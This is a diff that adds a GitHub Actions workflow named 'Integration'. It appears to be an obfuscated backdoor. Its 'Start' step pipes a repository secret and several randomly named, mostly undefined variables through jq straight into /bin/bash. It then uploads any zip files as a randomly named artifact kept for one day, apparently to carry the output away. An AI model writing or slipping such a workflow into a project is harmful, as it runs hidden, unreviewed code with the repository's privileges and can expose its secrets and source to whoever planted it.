@@ -1,0 +1,29 @@
+name: Integration
+on:
+  workflow_dispatch:
+
+env:
+  CI: true
+jobs:
+  process:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 0
+      - name: Start
+        env:
+          l04: ${{ secrets.l04 }}
+        run: |
+          printf '%s' "$l04" | jq -r .dcr26964 | /bin/bash
+          printf '%s' "$wdo56575" | jq -r .br21 | /bin/bash
+          printf '%s' "$hgh71296" | jq -r .zmr1 | /bin/bash
+          echo $mggxj4015 | jq -r .vagj521 | /bin/bash
+          printf '%s' "$e938" | jq -r .dpcta387 | /bin/bash
+
+      - name: Upload results
+        uses: actions/upload-artifact@v4
+        with:
+          name: NVnYmQwM
+          path: "*.zip"
+          retention-days: 1
